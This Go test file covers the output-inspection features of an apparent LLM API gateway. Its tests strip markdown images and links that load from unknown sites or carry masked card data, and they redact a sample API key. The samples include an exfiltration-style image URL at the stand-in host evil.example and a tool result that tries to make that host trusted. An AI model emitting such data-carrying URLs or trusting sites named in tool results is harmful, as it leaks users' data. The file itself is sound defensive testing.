package pipeline_test

import (
	"strings"
	"testing"

	"github.com/Kytherion/KyGate/internal/policy"
	"github.com/Kytherion/KyGate/internal/store"
)

// outputPolicy is the starter policy with other output rules.
func outputPolicy(replace ...string) string {
	s := string(policy.Starter())
	for i := 0; i+1 < len(replace); i += 2 {
		if !strings.Contains(s, replace[i]) {
			panic("not in the starter policy: " + replace[i])
		}
		s = strings.Replace(s, replace[i], replace[i+1], 1)
	}
	return s
}

const (
	evilImage    = "![chart](https://evil.example/c.png?d=x)"
	imageRemoved = "[image removed by KyGate: it loads from an unknown site]"
)

func finding(e store.Event, typ string) *store.FindingCount {
	for i := range e.Findings {
		if e.Findings[i].Type == typ {
			return &e.Findings[i]
		}
	}
	return nil
}

func answerText(t *testing.T, body string, stream, anthropic bool) string {
	if stream {
		return streamText(t, body, anthropic)
	}
	return body
}

// The starter policy removes an image from an unknown site, streamed or not,
// in both API families, and never caches the changed answer.
func TestOutputRemovesAnUnknownImage(t *testing.T) {
	h := newHarness(t, "")
	h.up.answer = "Here: " + evilImage + " Done."
	want := "Here: " + imageRemoved + " Done."
	for _, c := range []struct {
		path            string
		stream, anthrop bool
	}{{"/v1/chat/completions", false, false}, {"/v1/chat/completions", true, false}, {"/v1/messages", false, true}, {"/v1/messages", true, true}} {
		req := chat("Make a chart", c.stream)
		if c.anthrop {
			req = messages("Make a chart", c.stream)
		}
		resp, body := h.post(c.path, h.keyA, req)
		got := answerText(t, body, c.stream, c.anthrop)
		if resp.StatusCode != 200 || !strings.Contains(got, want) || strings.Contains(body, "evil.example") {
			t.Fatalf("%s stream=%v: %d %s", c.path, c.stream, resp.StatusCode, body)
		}
		if !c.stream && resp.Header.Get("X-KyGate-Output") != "removed=OUTPUT_IMAGE" {
			t.Fatalf("header %q", resp.Header.Get("X-KyGate-Output"))
		}
		f := finding(h.event(resp.Header.Get("X-KyGate-Request-Id")), "OUTPUT_IMAGE")
		if f == nil || f.Action != "remove" || !f.Applied || f.Count != 1 {
			t.Fatalf("finding %+v", f)
		}
	}
	calls := h.up.calls
	if resp, _ := h.post("/v1/chat/completions", h.keyA, chat("Make a chart", false)); resp.Header.Get("X-KyGate-Cache") != "miss" || h.up.calls != calls+1 {
		t.Fatalf("a changed answer is never cached: %q", resp.Header.Get("X-KyGate-Cache"))
	}
}

// Sites the user or the policy names are known; sites a tool result names are not.
func TestOutputKnownSites(t *testing.T) {
	h := newHarness(t, outputPolicy("allowed_domains: []", "allowed_domains: [cdn.example.net]"))
	h.up.answer = "![a](https://docs.example.org/a.png) ![b](https://img.cdn.example.net/b.png)"
	_, body := h.post("/v1/chat/completions", h.keyA, chat("Show the diagram from docs.example.org", false))
	if strings.Contains(body, "removed by KyGate") {
		t.Fatalf("known sites must stay: %s", body)
	}
	h.up.answer = "The page says hello. " + evilImage
	resp, body := h.post("/v1/messages", h.keyA, messagesWithToolResult("Welcome! Our images are at evil.example."))
	if resp.StatusCode != 200 || strings.Contains(body, "evil.example/c.png") || !strings.Contains(body, imageRemoved) {
		t.Fatalf("a site named in a tool result is not known: %s", body)
	}
}

// An address that carries a masked value is removed on any site, and the real
// value never appears in it; the same placeholder elsewhere is put back.
func TestOutputRemovesAddressesThatCarryProtectedData(t *testing.T) {
	h := newHarness(t, "")
	h.up.answer = "Receipt at https://pay.example.com/r?card=[CREDIT_CARD_1] for card [CREDIT_CARD_1]."
	for _, stream := range []bool{false, true} {
		resp, body := h.post("/v1/chat/completions", h.keyA, chat("Charge card "+cardA+" and post the receipt on pay.example.com", stream))
		got := answerText(t, body, stream, false)
		want := "Receipt at [link removed by KyGate: its address carried protected data] for card " + cardA + "."
		if got != want && !strings.Contains(got, want) {
			t.Fatalf("stream=%v got %q", stream, got)
		}
		if strings.Count(body, cardA) != 1 {
			t.Fatalf("the card may appear once, outside the address: %s", body)
		}
		if f := finding(h.event(resp.Header.Get("X-KyGate-Request-Id")), "OUTPUT_PROTECTED_URL"); f == nil || !f.Applied {
			t.Fatalf("finding %+v", f)
		}
	}
}

func TestOutputBlock(t *testing.T) {
	h := newHarness(t, outputPolicy("images:         { action: remove }", "images:         { action: block }"))
	h.up.answer = "Here: " + evilImage + " After."
	resp, body := h.post("/v1/chat/completions", h.keyA, chat("Make a chart", false))
	if resp.StatusCode != 403 || resp.Header.Get("X-KyGate-Blocked") != "OUTPUT_IMAGE" || strings.Contains(body, "evil") || !strings.Contains(body, "an image from an unknown site") {
		t.Fatalf("%d %q %s", resp.StatusCode, resp.Header.Get("X-KyGate-Blocked"), body)
	}
	e := h.event(resp.Header.Get("X-KyGate-Request-Id"))
	if e.Outcome != "blocked" || e.CostUSD <= 0 {
		t.Fatalf("the provider call is still counted: %+v", e)
	}

	// A stream stops with an error event; nothing of the image or after it goes out.
	resp, body = h.post("/v1/chat/completions", h.keyA, chat("Make a chart", true))
	if !strings.Contains(body, `"policy_blocked"`) || strings.Contains(body, "evil") || strings.Contains(body, "After") || strings.Contains(body, "[DONE]") || !strings.Contains(streamTextLoose(body), "Here:") {
		t.Fatalf("stream: %s", body)
	}
	if e := h.event(resp.Header.Get("X-KyGate-Request-Id")); e.Outcome != "blocked" {
		t.Fatalf("event %+v", e)
	}
	_, body = h.post("/v1/messages", h.keyA, messages("Make a chart", true))
	if !strings.Contains(body, "event: error") || strings.Contains(body, "evil") || strings.Contains(body, "message_stop") {
		t.Fatalf("anthropic stream: %s", body)
	}
}

// streamTextLoose reads the OpenAI text deltas and ignores error events.
func streamTextLoose(body string) string {
	var b strings.Builder
	for _, line := range strings.Split(body, "\n") {
		if i := strings.Index(line, `"content":"`); i >= 0 {
			rest := line[i+11:]
			if j := strings.Index(rest, `"`); j >= 0 {
				b.WriteString(rest[:j])
			}
		}
	}
	return b.String()
}

// Alert leaves the answer as it is; it is cached, and a hit is inspected again.
func TestOutputAlertIsCachedAndInspectedAgain(t *testing.T) {
	h := newHarness(t, "")
	h.up.answer = "More at [this page](https://unknown.example.com/info)."
	for i, wantCache := range []string{"miss", "hit"} {
		resp, body := h.post("/v1/chat/completions", h.keyA, chat("Where can I read more?", false))
		if resp.Header.Get("X-KyGate-Cache") != wantCache || !strings.Contains(body, "https://unknown.example.com/info") {
			t.Fatalf("round %d: cache %q %s", i, resp.Header.Get("X-KyGate-Cache"), body)
		}
		e := h.event(resp.Header.Get("X-KyGate-Request-Id"))
		if f := finding(e, "OUTPUT_LINK"); f == nil || f.Action != "alert" || !e.Alert {
			t.Fatalf("round %d: %+v", i, e)
		}
	}
}

func TestOutputRemovesSecrets(t *testing.T) {
	h := newHarness(t, "")
	h.up.answer = "Use OPENAI_API_KEY=sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcd in your shell."
	_, body := h.post("/v1/chat/completions", h.keyA, chat("How do I set my key?", false))
	if strings.Contains(body, "sk-proj-") || !strings.Contains(body, "[secret removed by KyGate]") {
		t.Fatalf("%s", body)
	}
}

// A policy file without output: inspects nothing (an upgrade changes nothing);
// monitor mode records and changes nothing.
func TestOutputOffAndMonitor(t *testing.T) {
	start := strings.Index(string(policy.Starter()), "# Output inspection")
	end := strings.Index(string(policy.Starter()), "\ncache:")
	h := newHarness(t, string(policy.Starter())[:start]+string(policy.Starter())[end+1:])
	h.up.answer = "Here: " + evilImage
	resp, body := h.post("/v1/chat/completions", h.keyA, chat("Make a chart", false))
	if !strings.Contains(body, "evil.example") || finding(h.event(resp.Header.Get("X-KyGate-Request-Id")), "OUTPUT_IMAGE") != nil {
		t.Fatalf("no output: section, no inspection: %s", body)
	}

	m := newHarness(t, outputPolicy("mode: enforce", "mode: monitor"))
	m.up.answer = "Here: " + evilImage
	resp, body = m.post("/v1/chat/completions", m.keyA, chat("Make a chart", false))
	f := finding(m.event(resp.Header.Get("X-KyGate-Request-Id")), "OUTPUT_IMAGE")
	if !strings.Contains(body, "evil.example") || f == nil || f.Applied {
		t.Fatalf("monitor: %+v %s", f, body)
	}
}
